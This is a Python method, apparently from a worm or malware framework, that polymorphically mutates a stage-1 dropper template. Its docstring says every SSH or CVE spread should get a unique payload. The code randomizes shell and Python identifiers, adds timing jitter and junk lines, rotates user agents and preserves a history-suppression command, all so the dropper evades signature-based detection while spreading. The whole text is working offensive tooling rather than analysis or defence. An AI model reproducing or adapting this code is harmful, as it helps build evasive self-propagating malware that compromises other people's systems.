    @staticmethod
    def _mutate_stage1(tmpl):
        """
        Polymorphic mutation of STAGE1_DROPPER_TEMPLATE.
        Each call returns a functionally-identical but lexically-unique dropper.
        Called by get_stage1_dropper() so every SSH/CVE spread gets a unique payload.

        Mutations:
          - Shell function names randomized (_have_dl, _dl, _dl_stdout, _py_ok)
          - Shell variable names randomized (PY3, _ARCH, _PB, _PYURLS, etc.)
          - Python PYEOF variable names randomized independently
          - Env-var bridge key strings ("_WD", "_S2_URLS") protected - never renamed
          - Sleep/jitter randomized, junk line inserted, UA rotated
        """
        import random, re as _re, string

        rng = random.Random()  # truly random every call

        _L = string.ascii_lowercase
        _U = string.ascii_uppercase
        _D = string.digits

        def rsh(n=5):
            return rng.choice(_U) + ''.join(rng.choice(_U + _D) for _ in range(n - 1))

        def rpy(n=5):
            return rng.choice(_L) + ''.join(rng.choice(_L + _D) for _ in range(n - 1))

        # ── split at PYEOF boundary ───────────────────────────────────────────
        lines = tmpl.split('\n')
        pyeof_open_line  = next((i for i, l in enumerate(lines) if "'PYEOF'" in l or '<<PYEOF' in l), -1)
        pyeof_close_line = -1
        for i in range(len(lines) - 1, -1, -1):
            if lines[i].strip() == 'PYEOF':
                pyeof_close_line = i
                break

        if pyeof_open_line < 0 or pyeof_close_line <= pyeof_open_line:
            shell_part, py_part, tail_part = tmpl, '', ''
        else:
            shell_part = '\n'.join(lines[:pyeof_open_line + 1])
            py_part    = '\n'.join(lines[pyeof_open_line + 1:pyeof_close_line])
            tail_part  = '\n'.join(lines[pyeof_close_line:])

        # ── protect env-var key strings (never rename these) ─────────────────
        _PROT = {
            '"_S2_URLS"': '"\x00S2U\x00"',
            "'_S2_URLS'": "'\x00S2U\x00'",
            '"_S2_WD"':   '"\x00S2WD\x00"',
            "'_S2_WD'":   "'\x00S2WD\x00'",
            '"_WD"':      '"\x00WD\x00"',
            "'_WD'":      "'\x00WD\x00'",
        }
        def protect(t):
            for k, v in _PROT.items(): t = t.replace(k, v)
            return t
        def restore(t):
            for v, k in _PROT.items(): t = t.replace(k, v)
            return t

        py_part = protect(py_part)

        # ── shell variable renames (longest first to prevent partial matches) ──
        # Skip _WD and _S2_URLS — their keys must match what Python reads in PYEOF
        sh_map = [
            ('_DROPPER_BASH', '_' + rsh(8)),
            ('_dl_stdout',    '_' + rsh(8)),   # BEFORE _dl to avoid partial match
            ('_have_dl',      '_' + rsh(7)),
            ('_PYURLS',       '_' + rsh(6)),
            ('_py_ok',        '_' + rsh(6)),
            ('_dl',           '_' + rsh(4)),   # AFTER _dl_stdout
            ('_ARCH',         '_' + rsh(4)),
            ('_PB',           '_' + rsh(4)),
            ('_TD',           '_' + rsh(4)),
            ('_out',          '_' + rsh(4)),
            ('_rn',           '_' + rsh(3)),
            ('_jr',           '_' + rsh(3)),
            ('_url',          '_' + rsh(4)),
            ('_p',            '_' + rsh(2)),
            ('PY3',           rsh(5)),
        ]

        sh_out = shell_part
        for old, new in sh_map:
            sh_out = _re.sub(
                r'(?<![A-Za-z0-9_])' + _re.escape(old) + r'(?![A-Za-z0-9_])',
                new, sh_out
            )

        # ── Python variable renames (longest first) ───────────────────────────
        py_map = [
            ('_fp_dir',  '_' + rpy(6)),
            ('_fpos',    '_' + rpy(5)),
            ('_s2_raw',  '_' + rpy(6)),
            ('_data',    '_' + rpy(5)),
            ('_code',    '_' + rpy(5)),
            ('_URLS',    '_' + rpy(5).upper()),
            ('_ctx',     '_' + rpy(4)),
            ('_UA',      '_' + rpy(3).upper()),
            ('_url',     '_' + rpy(4)),
            ('_WD',      '_' + rpy(3).upper()),
            ('_pad',     '_' + rpy(4)),
            ('_fr',      '_' + rpy(3)),
            ('_fm',      '_' + rpy(3)),
            ('_fb',      '_' + rpy(3)),
            ('_fn',      '_' + rpy(3)),
            ('_g',       '_' + rpy(2)),
            ('_d',       '_' + rpy(2)),
        ]

        py_out = py_part
        for old, new in py_map:
            py_out = _re.sub(
                r'(?<![A-Za-z0-9_])' + _re.escape(old) + r'(?![A-Za-z0-9_])',
                new, py_out
            )

        py_out = restore(py_out)

        # ── timing jitter ─────────────────────────────────────────────────────
        jitter_base = rng.randint(1, 5)
        jitter_mod  = rng.randint(6, 12)
        old_jitter = 'sleep "0.$((RANDOM % 9 + 1))"'
        new_jitter = f'sleep "0.$(( RANDOM % {jitter_mod} + {jitter_base} ))"'
        sh_out = sh_out.replace(old_jitter, new_jitter)

        # ── junk line after HISTFILE export ───────────────────────────────────
        _jv = rng.randint(1000, 9999)
        junk_opts = [
            f'export _T{_jv}=0 2>/dev/null',
            'command -v sh >/dev/null 2>&1||true',
            f': # {_jv}',
            '[ -d /proc ]&&true||:',
            'test -n "$PATH"||true',
        ]
        junk_line = rng.choice(junk_opts)
        sh_out = sh_out.replace(
            'export HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0\n',
            f'export HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0\n{junk_line}\n',
            1
        )

        # ── user-agent rotation ───────────────────────────────────────────────
        ua_pool = [
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'curl/7.88.1',
            'Wget/1.21.3',
        ]
        old_ua = 'Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0'
        new_ua = rng.choice(ua_pool)
        py_out = py_out.replace(old_ua, new_ua)
        sh_out = sh_out.replace(old_ua, new_ua)

        return sh_out + '\n' + py_out + '\n' + tail_part
